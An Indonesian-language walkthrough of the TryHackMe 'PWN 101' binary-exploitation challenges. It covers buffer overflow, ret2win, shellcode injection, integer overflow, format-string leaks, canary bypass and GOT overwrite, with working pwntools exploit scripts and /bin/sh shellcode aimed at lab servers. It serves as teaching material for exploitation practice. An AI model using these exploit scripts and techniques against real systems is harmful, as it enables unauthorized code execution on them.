---
title: 'Write Up Try HackMe - PWN 101'
disqus: de13ugg1ng
---

Try HackMe - PWN 101
===
Attachment -> ![downloads](https://img.shields.io/github/downloads/atom/atom/total.svg)

## Daftar Isi
[TOC]

##  Challange 1 - pwn101

###    Deskripsi
This should give you a start: 'AAAAAAAAAAA'
### TL; DR
Challange ini adalah **Buffer Overflow** biasa. Jika dilihat dari decompile File, terdapat instruction **Gets()** yang bisa di manfaatkan untuk Buffer Overflow agar bisa mengubah nilai dari **local_c**.

![image](https://hackmd.io/_uploads/H1Ki0PClfl.png)

Ya, jadi intinya jika **penyimpanan** untuk input user hanya di sediakan sebanyak **60 Char**. Tapi kita memasukkan **lebih dari 60 Char**, kita bisa melakukan **exploit** seperti mengubah nilai dari register atau bahkan alur program. Di kasus Chall ini, kita bisa memasukkan input secara **unlimited** karena instruction **Gets()** sendiri itu akan menerima semua input kita. Bisa dibilang ini instruction yang broken parah. 

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/ryO2eOCxMl.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/BJkm-ORgze.png)

Bisa di lihat disini, flow programnya terlihat jelas ya. Jadi local_c di set nilainya 0x539. Lalu, setelah gets() di panggil, dimana kita akan memberikan input disana. Terdapat if else, jika local_c = 0x539 program akan exit().

Jadi, tujuan kita disini adalah untuk mengubah nilai dari local_c agar tidak 0x539.

![image](https://hackmd.io/_uploads/BkgcAWdCgzl.png)

Kalau kalian perhatikan disini, penyimpanan untuk local_48, atau variable yang menyimpan input user. Hanya memiliki panjang sebanyak 60 Char saja. Jadi logikanya, jika kita input sebanyak 61 Char. Program akan ter exploit dan nilai variable dibawahnya berubah.

![image](https://hackmd.io/_uploads/ryVd7_0gze.png)

Jadi, disini kan 0x539 disimpan ke address 0x7fffffffd83c. Nah, nilai awalnya jika di cek segini:

![image](https://hackmd.io/_uploads/BkP6XdAgfe.png)

Nah, setelah kita memasukkan Char dengan panjang 61 char. Dia ter overflow dan nilainya berubah:

![image](https://hackmd.io/_uploads/BJsl4O0lfe.png)

![image](https://hackmd.io/_uploads/BJmWNd0efg.png)

Sehingga, kita bisa mendapatkan shell dan cat flag.txt. Lalu challange selesai.

![image](https://hackmd.io/_uploads/BkBUNOAxfl.png)


##  Challange 2 - pwn102

###    Deskripsi
Submit the flag
### TL; DR
Ini adalah Chall **Buffer Overflow**. Jika dilihat dari decompile File, terdapat instruction **__isoc99_scanf()** yang bisa di manfaatkan untuk Buffer Overflow agar bisa mengubah nilai dari **local_10 dan local_c**.

![image](https://hackmd.io/_uploads/H1Ki0PClfl.png)

Ya, jadi intinya jika **penyimpanan** untuk input user hanya di sediakan sebanyak **60 Char**. Tapi kita memasukkan **lebih dari 60 Char**, kita bisa melakukan **exploit** seperti mengubah nilai dari register atau bahkan alur program. Di kasus Chall ini, kita bisa memasukkan input secara **unlimited** karena instruction **Gets()** sendiri itu akan menerima semua input kita. Bisa dibilang ini instruction yang broken parah. 

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/SJEZYO0lGe.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/ryRGF_ReGe.png)

Disini flow programnya sangat jelas ya. Pertama, program setup nilai **local_c** dan **local_10**. Lalu melakukan **printf** "I need..." Dan meminta **input** user dengan instruction **isoc00_scanf()**. Setelah itu dibawahnya terdapat if else. 

Jika nilai dari **local_c dan local_10** adalah **0xc0ff33** dan **0xc0d3**. User akan mendapatkan **shell** dan bisa melakukan **cat flag.txt**. Jika nilainya berbeda, program akan **exit()**.

![image](https://hackmd.io/_uploads/BJgI5_Cxzx.png)![image](https://hackmd.io/_uploads/H1ZBqdRgMg.png)

Jika dilihat dari decompile. input user dimasukkan ke local_78. Dimana space nya hanya 104 char. Buktinya? Dari stack nya berlokasi di -0x78 dan di stack atasnya adalah local_10 yang berada di -0x10. Jika kita kurangi:

![image](https://hackmd.io/_uploads/BkDyodReMg.png)

hasilnya benar 104. Jadi urutan penyimpanan / stack dari programnya adalah:
**[ saved rbp] 
[ local_c  ] 
[ local_10 ] 
[ local_78 ]**
Kalo overflow itu emang dari bawah ke atas ya, jadi urutan exploitnya kaya gini:
**Overflow local_78** -> timpa **local_10** dengan **0xc0d3** -> timpa **local_c** dengan -> **0xc0ff33** -> Dapat **shell**.

![image](https://hackmd.io/_uploads/Sk-8TOAefl.png)

```a
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn102-1644307392479.pwn102'
# p = process(chall)
p = remote('10.49.141.104', 9002)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# break *0x00000000004007c3
# ''')

payload = b'A' * 104
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

p.sendlineafter('Am I right?',payload)
p.interactive()


# Exploit:
# 
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Kenapa disini menggunakan **p32**? Karena variable kayak **local_c** dan **local_10** itu menyimpan dalam format **8 byte**. Jadi kita gunakan p32(). Agar **0xc0d3 dan 0xc0ff33** berubah **sesuai dengan format variable** nya.


##  Challange 3 - pwn103

###    Deskripsi
Submit the flag
### TL; DR
Challange ini adalah **Ret 2 Win** biasa. Jika dilihat dari decompile File, terdapat function **general()** yang memiliki vulnerability Buffer Overflow. Dan function **admins_oly()** yang memiliki instruction spawn shell: **system("/bin/sh");**. Jadi tujuan **exploit** kita adalah melakukan overflow dari general, dan mengubah address **RETURN** agar melompat ke **admins_only()**.

![image](https://hackmd.io/_uploads/ry4tQKCeGx.png)

Ya, jadi intinya jika terdapat funciton yang melakukan **spawn shell atau read flag.txt** dan di dalam program terdapat vulnerability **Buffer Overflow**. Bisa dikatakan program tersebut adalah challange **Ret2Win**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/BJhMVFRlfe.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/ry6mNYCgfl.png)

hasil decompile menunjukkan alur program yang jelas ya. Disini program langsung masuk ke loop while true, jadi kita tidak bisa melakukan exploit bufferoverflow walaupun scanf disana memungkinkan buffer overflow.

![image](https://hackmd.io/_uploads/r16xrtClMl.png)

Tapi, kalau kita lihat case 3 yang memasuki function **general()**. Terdapat vulnerability Buffer Overflow yang bisa di exploit.

Jadi, di input pertama. Kan masih di bagian **main()** tuh, nah send '3' agar masuk ke case 3 dimana melompat ke fuction **general()** ini.

Lalu, dari **general()**. Coba debug dulu lewat tools **pwndbg**, dengan **cyclic**. Fungsinya agar mengetahui **offset / jarak** dari input ke instruction **RETURN**. Jadi urutan dari **Binary File** nya itu:
**[ local_28 ]
[ Saved RBP ]
[ RET ]**
**SEHARUSNYA** seperti ini, tapi jika ingin mengetahui offset yang lebih pasti ada di berapa char. Harus menggunakan **cyclic** dengan **pwndbg**

![image](https://hackmd.io/_uploads/Sk4EPF0gfe.png)

Pertama, di break dulu di general. Agar saat program berjalan dan masuk ke general. Akan berhenti disana.

![image](https://hackmd.io/_uploads/BJXIDtAgGl.png)

Running, dan input '3'

![image](https://hackmd.io/_uploads/SyvODt0efx.png)
Nah, jika sudah masuk ke debugging di general() seperti ini. ketik command
`cylcic 1000`
Nanti akan muncul output pattern string yang panjang seperti pada gambar. Itu di copy aja.

![image](https://hackmd.io/_uploads/H1jZut0eGe.png)

Lanjut, ketik c / continue untuk melanjutkan alur program yang tadi ter stop. Lalu input kedua, paste hasil output cyclic 1000 tadi. Nanti program bakal ter SIEGSIV seperti ini karena penyimpanan / stack nya terpenuhi dengan output cylcic input kita tadi.

![image](https://hackmd.io/_uploads/Byhu_tRgfg.png)

Nah, di bagian DISASM. itu ada instruction ret. Tapi di kanannya, addressnya aneh. Karena itu ter replace oleh string dari overflow kita tadi. Nah, **cara tahu offsetnya sampai ke ret gimana?**
Copy bagian ini:![image](https://hackmd.io/_uploads/rJyyFF0gze.png) teks `kaaalaaa` aja.
Terus, command: `cyclic -l kaaalaaa`

![image](https://hackmd.io/_uploads/B1vMFK0xfx.png)

Nah, outputnya adalah offset sampai ke instruction ret adalah 40 char.

Sekarang kita cari address win nya.

![image](https://hackmd.io/_uploads/HJAcKY0gzl.png)

Di tabel function ditemukan function yang mencurigakan nih, **admins_only()**.

![image](https://hackmd.io/_uploads/SyQCKKAgGg.png)

Nah, di admins_only ternyata ada spawn shell: `system('/bin/sh');`
Dan jika dilihat addressnya function admins_only() ini adalah: 0x0000000000401554

![image](https://hackmd.io/_uploads/S1cz9tRxMx.png)


Jadi exploitnya adalah:
input '3' -> masuk ke general() -> Buffer Overflow dengan input A sepanjang 40  -> tulis address function admins_only()

Tapi untuk menghindari gagal exploit, biasanya di binary 64 bit. Setelah Buffer Overflow, ditambahkan **gadget ret**. Agar payloadnya aman, aku kurang tahu sih itu buat apa? Kalian tau?

![image](https://hackmd.io/_uploads/H1s09FAgze.png)

Aku biasanya menggunakan command ini untuk mencari address dari gadget seperti ret, rdi, dll.
`ROPgadget --binary (nama file)  | grep "(nama gadget)"`

Jadi exploitnya fix nya adalah:
input '3' -> masuk ke general() -> Buffer Overflow dengan input A sepanjang 40 -> tulis address ret -> tulis address function admins_only() -> dapat shell -> cat flag.txt -> dapat flag.

![image](https://hackmd.io/_uploads/rkRLjtAxzx.png)

![image](https://hackmd.io/_uploads/BJfdsFCgfx.png)


##  Challange 4 - pwn104

###    Deskripsi
Submit the flag
### TL; DR
Challange ini adalah **Spawn Shellcode** biasa. Jika dilihat dari decompile File, terdapat instruction **printf()** yang melakukan print untuk address **local_58**. Dan instruction **read()** yang membaca sepanjang 200 char. Tapi masalahnya input user di simpan ke local_58 yang space nya hanya 80 char. Jadi tujuan **exploit** kita adalah menuliskan shellcode, lalu Buffer Overflow sampai RET. Dan ubah RET menjadi address local_58 yang sudah di leak dari **printf()**

![image](https://hackmd.io/_uploads/rJ1MwiClGx.png)


Ya, jadi intinya jika terdapat funciton yang bisa melakukan leak address. Dan di dalam program terdapat vulnerability **Buffer Overflow** dan jika di checksec NX nya Disable. Bisa dikatakan program tersebut adalah challange **Ret2Shellcode**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/r1gqDo0gzg.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/rkGiPj0xGl.png)

Nah, disini terlihat kalau binary ini NX nya disable dan No stack & No 
Canary. Jadi address dari function nya tidak akan berubah, dan bisa dilakukan spawn shell.

![image](https://hackmd.io/_uploads/Bk_y_o0lMx.png)

Nah, di bagian ini. Program melakukan print untuk address stack dari local_58. Tapi karena ini stack. Pasti akan selalu berubah addressnya setiap kita menjalankan program. Jadi, kita coba untuk mengambil addressnya dengan `recv()` dari library `from pwn import *`.

![image](https://hackmd.io/_uploads/HkVvOj0gMg.png)

Lalu, kita check untuk offset nya sampai ke RET itu berapa char. Dengan menggunakan `pwndbg` dan command `cyclic`.

![image](https://hackmd.io/_uploads/SJPlKjRxMe.png)
![image](https://hackmd.io/_uploads/rkGWFiAgGe.png)

Kita ambil rsp nya, lalu `cyclic -l `

![image](https://hackmd.io/_uploads/ry6mFjClfl.png)

Nah, ternyata offsetnya sampai ke RET itu adlaah 88 char.
Oke, lalu langkah terakhir adalah mencari script untuk spawn shell.

![image](https://hackmd.io/_uploads/HkRvFjRgMl.png)

Ya, disini saya dibantu Gemini untuk generate spawn shell nya. 

Jadi alur exploitnya adalah:
Send **shellcode** -> penuhin dengan **char A sampai char ke 88**. Dengan cara: 'A' * (88 - len(shellcode)) -> tumpuk **RET** dengan address **local_58** yang sudah ter leak di awal.

![image](https://hackmd.io/_uploads/SyHvoi0efe.png)
![image](https://hackmd.io/_uploads/Hk-jijAxMe.png)


```a
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn104-1644300377109.pwn104'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

#gdb.attach(p, gdbscript='''
#
#''')

leak = p.recv()
# leak = leak[-15:].strip().decode()
leak_address = leak.split(b"at ")[1].strip().decode()

print(f"[*] Leak Address found: {leak_address}")

stack_address = int(leak_address, 16)
print(stack_address)

shellcode = asm("""
    xor rsi, rsi           
    xor rdx, rdx           
    mov rax, 0x68732f2f6e69622f 
    push rsi               
    push rax               
    mov rdi, rsp           
    mov eax, 59             
    syscall
""")

print(len(shellcode))
payload = shellcode + b'A' * (88 - len(shellcode)) + p64(stack_address)

p.sendline(payload)
p.interactive()


# # Exploit:
# # 
# # matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# #0x7fffffffd220
```


##  Challange 5 - pwn105

###    Deskripsi
Integer Overflow
### TL; DR
Challange ini adalah **Integer Overflow** biasa. Jika dilihat dari decompile File, terdapat instruction **scanf()** yang akan melakukan pertambahan untuk input kita. Dan jika hasilnya < 0. Akan membuka shell dan mendapatkan Flag.

![image](https://hackmd.io/_uploads/HJuSJ20efe.png)

Ya, jadi intinya di dalam konsep **int**. Jika nilai tertinggi ditambah dengan 1, dia malah akan menjadi nilai terendah.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/HyS312Clzx.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/SJgCknReMx.png)

Disini bisa dilihat alur programnya. Program meminta input user sebanyak 2x. Pertama disimpan ke local_1c, dan yang kedua disimpan ke local_18. Setelah itu, kedua input kita ditambah dan dicek. Apakah **hasilnya <0**. Jika iya, shell muncul. Jika tidak, maka dia return().

![image](https://hackmd.io/_uploads/HJiuen0efx.png)

Tapi disini kita tidak bisa melakukan buffer overflow. Karena terdapat pengecekan nilai untuk local_1c dan local_18. Dan karena saya agak malas buat cari cara overflow nya juga.

![image](https://hackmd.io/_uploads/SyC1-hReMl.png)

Nah, disini dikatakan kalau int bakal bisa >0 kalau nilai max + 1. Jadi langsung aja. Cara mendapatkan shell nya adalah:
send 2147483647 -> lalu send 1 -> dapat shell -> cat flag.txt

![image](https://hackmd.io/_uploads/SkmUb3Refx.png)

```a
from pwn import *
import sys

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn105-1644300421555.pwn105'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# break *0x00000000004007c3
# ''')


p.sendline('2147483647')
p.sendline('1')
p.interactive()


# Exploit:
# 2147483647
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```


##  Challange 6 - pwn106

###    Deskripsi
Format string exploit
### TL; DR
Challange ini adalah **Format string exploit** yang tidak biasa. Jika dilihat dari decompile File, semua nya terlihat bersih. Tidak ada string flag.txt ataupun /bin/sh. Dan dari checksec pun semua security nya aktif. Mulai dari Pie, NX, dan Canary. Tapi disini NX nya disable. Masalahnya, dari attachment file tidak diberikan **libc**. Dan setelah dilakukan leak address dengan %p juga tidak ada address libc yang bisa kita jadikan acuan untuk mencari dari **libc database**. Jadi yang seharusnya ini adalah Ret2Libc. Tidak bisa dilakukan karena kita tidak tahu **addressnya**. Dan setelah diskusi dengan gemini, chall ini ternyata melakukan harcoded flag nya langsung ke binary. Dengan penjelasan: 

![image](https://hackmd.io/_uploads/SJDsL2kZGl.png)


Ya, jadi intinya string flag itu di panggil dari file docker. Masalahnya dari attachment hanya diberikan **binary file**. yap benar. Ini challange Ghoib.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/rJy7w3kZzl.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/r1W4whkWMe.png)

Decompile nya terlihat sangat rapi. Hanya ada vulnerability **printf()** yang digunakan untuk leak address. Tidak ada Buffer overflow karena **read()** hanya dibatasi membaca input sepanjang **0x32 / 50** char. Sedangkan space penyimpanannya di **local_48** itu 56 Char.

![image](https://hackmd.io/_uploads/SyRjv3kbfl.png)

Karena setelah di cari-cari tidak ditemukan sesuatu yang aneh, dan saya tidak bisa menemukan **file libc** nya. Saya coba penjelasan dari **gemini**. Dimana harusnya jika **leak** nya cukup banyak, **string flag** yang dipanggil dari **docker** akan ter leak.
```a
from pwn import *

context.log_level = 'error' #debug / info / warning / error / critical / notset

leak_flag = []
for i in range(1, 101):
    p = remote('10.48.170.148', 9006)
    p.recvuntil(b'giveaway: ')
    payload = f'%{i}$p'.encode()
    p.sendline(payload)
    hasil = p.recv().strip().replace(b'Thanks ',b'').replace(b'\n\x7f',b'').strip()
    try:
        print('{'+str(i)+'}'+str(p64(int(hasil.decode(), 16))))
    except ValueError:
        print(f'{{{i}}} -> {hasil!r}')

    sleep(0.1)


p.interactive()
```
Kita lakukan fuzzing dan disini aku coba langsung mengubah leak addressnya menjadi format p64. Jika ada string flag seharusnya langsung muncul.

![image](https://hackmd.io/_uploads/H1X3KhJWGl.png)

Nah, pernyataan dari gemini ternyata benar. Flag nya muncul di offset %p ke 6 - 11. Selanjutnya tinggal mengambil offset ke 6-11. Lalu rakit menjadi urutan flag yang benar.

![image](https://hackmd.io/_uploads/SyEzqn1-Ml.png)

Solver:
```a
from pwn import *

context.log_level = 'error' #debug / info / warning / error / critical / notset

chall = './pwn106-user-1644300441063.pwn106-user'

#FUZZING
leak_flag = []
for i in range(6, 12):
    p = remote('10.48.170.148', 9006)
    p.recvuntil(b'giveaway: ')
    payload = f'%{i}$p'.encode()
    p.sendline(payload)
    hasil = p.recv().strip().replace(b'Thanks ',b'').replace(b'\n\x7f',b'').strip()
    print('{'+str((i))+'}'+str(hasil.decode()))
    leak_flag.append(int(hasil, 16))
    sleep(0.1)
hasil_flag = b''
print(leak_flag)
for i in leak_flag:
    hasil_flag += p64(i)
print('FLAG: ', hasil_flag.decode())

p.interactive()

# pwndbg> x/gx rsp
# 0x7ffcb36ae0d8: 0x0000563e591572b3
#offset 6 - > 11 = flag
```


##  Challange 7 - pwn107

###    Deskripsi
Bypassing mitigations
### TL; DR
Challange ini adalah **Format string exploit dan Ret2Win** biasa. Jika dilihat dari decompile File, terdapat dua vulnerability. Yang pertama adalah **printf(local_48);** yang bisa digunakan untuk melakukan leak address. Dan Buffer Overflow di **read(0,local_28,0x200);** yang dimana **local_28** size nya hanya **24 char**. Tapi dari **checksec**, bisa dilihat kalau canary, Pie, dan NX nya enable. Full Rellro lagi. jadi full security disini. VUlnerability nya hanya 2 instruction itu.
Alur exploit yang memungkinkan adalah:
Leak **canary & base address** -> **Buffer Overflow** -> **Timpa canary** dengan nilai yang sama -> tambahkan **8 byte** sampah RBP -> **RET ke win** function.

![image](https://hackmd.io/_uploads/SyrFqJlWzg.png)
![image](https://hackmd.io/_uploads/S195ckebMe.png)

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/BJrJjyeWGl.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/B1pgoyxZMl.png)

Nah, jadi disini, ada satu vulnerability **printf()**. Yang bisa kita gunain buat melakukan leak canary dan melakukan kalkulasi base address.

Dari hasil fuzz dengan fuzz.py ini:
```a
from pwn import *

context.log_level = 'error' #debug / info / warning / error / critical / notset

chall = './pwn107-1644307530397.pwn107'
for i in range(1,101):
    p = process(chall)
    p.recv()
    payload = b'A' * 8 + f'%{i}$p'.encode()
    p.sendline(payload)
    hasil = p.recvuntil(b'[')
    teks_asli = hasil.decode().strip()
    match = re.search(r'0x[0-9a-fA-F]+', teks_asli)
    
    if match:
        address_hex = match.group(0)
        print(f"{{{i}}} {address_hex}")
    else:
        print(f"{{{i}}} Alamat hex tidak ditemukan ",teks_asli)
    p.sendline(b'')

p.interactive()
```

![image](https://hackmd.io/_uploads/Syu_sJe-ze.png)

Bisa dilihat nomor ke **33** dan **45**. Itu ada canary dan leak dari **_start+42**.

![image](https://hackmd.io/_uploads/HyzSp1lbGx.png)
![image](https://hackmd.io/_uploads/H11c3JxWze.png)

Ini leak untuk perhitungan address win

![image](https://hackmd.io/_uploads/BJRup1l-fg.png)
![image](https://hackmd.io/_uploads/S13hTJxWGx.png)

Ini adalah leak untuk canary nya.

Setelah itu, jika dilihat dari decompile Binary File. Terdapat vulnerability Buffer Overflow disini:![image](https://hackmd.io/_uploads/BJVeA1xZfx.png).
Read mengambil input user sampai 0x200, sedangkan local_28 hanya memiliki memory sebanyak ![image](https://hackmd.io/_uploads/BJ-V0Je-Gl.png) 32 Char saja.

Jadi langkah Ret2Win yang akan dilakukan:
**Buffer Overflow** local_28 -> **timpa canary** dengan leak canary yang sudah di dapat -> Tambahkan **8 byte** sampah -> **RETURN ke Win** Function 

Ini win functionnya:

![image](https://hackmd.io/_uploads/HksjA1g-Ge.png)

Oh iya, untuk leak canary dan addressnya itu bakal berbeda offsetnya dari server dan local. Jadi sebagai saran, langsung debugging dengan gdb dan lakukan fuzzing langsung ke remote.

![image](https://hackmd.io/_uploads/S1wO1gxWzg.png)

Script Solver Final:
```a
from pwn import *

context.log_level = 'error' #debug / info / warning / error / critical / notset

chall = './pwn107-1644307530397.pwn107'
# p = process(chall)
p = remote('10.48.138.180', 9007)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# ''')
p.recv()

payload = b'%13$p,%41$p'
p.sendline(payload)

hasil = p.recvuntil(b'[')
print(hasil)

teks_asli = hasil.decode(errors='ignore').strip()
match = re.search(r'0x[0-9a-fA-F]+,0x[0-9a-fA-F]+', teks_asli)
canary,baseleak = match.group(0).split(',')

canary = int(canary, 16)
base = int(baseleak, 16) + 0x1c5

print('canary: ',hex(canary))
print('base: ',hex(base)) 

payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8
payload += p64(base)
p.sendline(payload)

p.interactive()

# Exploit:
#  leak canary & _start+42 address -> hitung base address -> Bufferoverflow -> timpa canary -> timpa rbp dengan 8 byte B -> RET ke win
#  leak _start+42 + 0x1a2 = address win
#  
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

##  Challange 8 - pwn108

###    Deskripsi
GOT Overwrite
### TL; DR
Alur exploit yang memungkinkan adalah:
Challange ini adalah **GOT Overwrite dan Ret2Win** biasa. Jika dilihat dari decompile File, terdapat vulnerability **printf()**. Tapi, permasalahannya setelah leak. Program langsung exit dan kita tidak bisa membuat program melakukan loop. Karena terdapat **stack canary**. Dan juga tidak ada **Buffer Overflow**. Tapi, dari hasil **checksec**, ternyata Binary ini **No PIE**. Jadi, address dari semua Binary nya tidak akan berubah kecuali **Address Stack**. Langkah yang memungkinkan untuk melakukan exploit adalah dengan GOT Overwrite, dengan merubah **puts@GLIBC_2.2.5()** menjadi address win **holidays()**.

Langkah Exploitnya simple:
**Fuzzing**, sampai ketemu input kita -> catat **offsetnya**, lalu lakukan **fmstr_payload** -> send ke bagian **local_78** -> **puts()** akan berubah menjadi address **Win** -> Dapat **Shell**.

![image](https://hackmd.io/_uploads/rkok2geWfg.png)
![image](https://hackmd.io/_uploads/BJzMhgeWMe.png)


### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/Sk54nexbGg.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/SJGU3egWMg.png)

Disini terlihat jelas jika hanya ada 1 vulnerability yang critical ya. **printf(local_78)**. Walaupun tidak bisa di **Buffer Overflow**. Kita masih bisa melakukan leak offset sampai ke input dengan fuzzing. Kenapa butuh? Karena di **fmstr_payload**, which is tools keren yang bisa merubah instruction di **GOT** seperti **puts()** menjadi JUMP to Win address. Dia membutuhkan offset dari printf sampai ke input kita.

![image](https://hackmd.io/_uploads/H1uVTxl-zg.png)

```from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn108-1644300489260.pwn108'
# p = process(chall)
p = remote('10.48.182.125', 9008)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# break *0x00000000004007c3
# ''')
p.sendline(b'A')
offset = 10
payload = fmtstr_payload(offset, {0x404018: 0x000000000040123b},write_size='short')
p.send(payload)
p.interactive()


# Exploit:
# 
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Seperti ini, disini dicoba melakukan input A * 8 terus menerus untuk setiap fuzzing nya. Dan di offset ke 10 terdapat 0x414141.... dimana itu adalah AAAA... Jadi, offset input kita adalah 10. Dan itu salah satu informasi yang kita butuhkan.

![image](https://hackmd.io/_uploads/BJ13axgWGe.png)

Informasi sisanya adalah **Address instruction GOT**, disini aku bakal pakai **GOT puts()**. Dan Address Win, di function **holidays()**.

![image](https://hackmd.io/_uploads/Hy_0pelbGe.png)
![image](https://hackmd.io/_uploads/r1czCeeZfg.png)

Address **GOT puts()** adalah -> **0x404018**
Address **Win** adalah -> **0x000000000040123b**

Langkah Exploit Finalnya:
Send A, untuk mengisi input di **local_98** -> input **fmstr_payload** ke **local_78** -> **puts()** berubah menjadi jump ke address **Win** -> Dapat **shell**.

![image](https://hackmd.io/_uploads/HkbS1Zl-zl.png)
![image](https://hackmd.io/_uploads/BJJLybebzl.png)
![image](https://hackmd.io/_uploads/Bywd1Webfl.png)

```a
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn108-1644300489260.pwn108'
# p = process(chall)
p = remote('10.48.182.125', 9008)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# break *0x00000000004007c3
# ''')
p.sendline(b'A')
offset = 10
payload = fmtstr_payload(offset, {0x404018: 0x000000000040123b},write_size='short')
p.send(payload)

p.interactive()

# Exploit:
# 
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```


##  Challange 9 - pwn109

###    Deskripsi
Return to PLT
### TL; DR
Challange ini adalah **Ret2PLT** yang agak gak biasa. Disini kita hanya diberi attachment Binary File saja. DIMANA BIASANYA RET2PLT HARUSNYA ADA FILE **libc**. TAPI INI GAADA. Kalian bisa cari sendiri di libc database dan debugging ber jam-jam kalau mau. Tapi ini aku udah siapin file libc dan ld nya buat kalian.

[![image](https://hackmd.io/_uploads/BybaDHlZMx.png)](//drive.google.com/drive/folders/1JVWpI1r0JeYmLN-Re0qUkk5ltEyAoAw5?usp=sharing)

